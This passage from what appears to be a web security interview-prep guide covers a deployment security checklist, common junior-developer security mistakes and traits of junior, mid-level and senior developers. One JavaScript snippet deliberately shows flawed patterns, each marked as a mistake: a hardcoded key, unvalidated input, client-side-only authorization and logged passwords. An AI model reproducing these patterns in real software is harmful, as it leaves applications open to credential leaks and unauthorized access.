// - Authentication changes reviewed by security team
// - Authorization checks verified
// - Input validation confirmed

// 3. Secrets management
// - No secrets in code
// - Environment variables configured
// - Secrets rotated for production

// 4. Security headers
// - CSP configured
// - HSTS enabled
// - X-Frame-Options set

// 5. HTTPS
// - SSL certificate valid
// - HTTP to HTTPS redirect
// - HSTS preload

// 6. Authentication
// - MFA enabled for admin accounts
// - Session timeout configured
// - Rate limiting active
`

## Key Points:
- Run security scans (npm audit, Snyk, SonarQube)
- Code review for security changes
- Verify secrets management
- Test authentication and authorization
- Check security headers
- Validate HTTPS configuration
- Document deployment security

## Interview Tip:
Have a pre-deployment security checklist -- it shows thoroughness.

---

## Question: What security mistakes do junior developers commonly make?

## Answer:
Common mistakes include: storing secrets in source code, not validating input, using client-side only authorization, logging sensitive data, using outdated dependencies, not implementing rate limiting, and assuming frameworks handle all security.

`javascript
// Common mistakes:
// 1. Secrets in source code
const API_KEY = 'sk_live_abc123'; // DANGEROUS

// 2. No input validation
app.post('/api/users', async (req, res) => {
  await db.createUser(req.body); // No validation
});

// 3. Client-side only authorization
if (user.role === 'admin') {
  showAdminPanel(); // Server still vulnerable
}

// 4. Logging sensitive data
console.log('User login:', { email, password }); // DANGEROUS

// 5. Outdated dependencies
// package.json with known vulnerabilities
`

## Key Points:
- Storing secrets in source code
- Not validating input
- Client-side only authorization (bypassable)
- Logging sensitive data
- Using outdated dependencies
- Not implementing rate limiting
- Assuming frameworks handle all security

## Interview Tip:
Mention mistakes you've seen (or made) -- it shows growth and awareness.

---

## Question: In your opinion, what separates a junior, mid-level, and senior security-aware developer?

## Answer:
Junior developers know basic security concepts (hash passwords, use HTTPS). Mid-level developers implement security controls (authentication, authorization, input validation). Senior developers design secure architectures, perform threat modeling, and mentor teams.

`javascript
// Junior: Knows basics
// I should hash passwords with bcrypt

// Mid-level: Implements controls
// I'll implement JWT authentication with refresh tokens

// Senior: Designs architecture
// I'll design a multi-tenant auth system with RBAC, audit logging,
// and defense in depth against OWASP Top 10
`

## Key Points:
- Junior: Knows basic security concepts
- Mid-level: Implements security controls
- Senior: Designs secure architectures, performs threat modeling
- Senior: Mentors teams, conducts security reviews
- Senior: Understands compliance requirements
- Senior: Balances security with business needs

## Interview Tip:
Show where you are and where you're growing -- it demonstrates self-awareness.

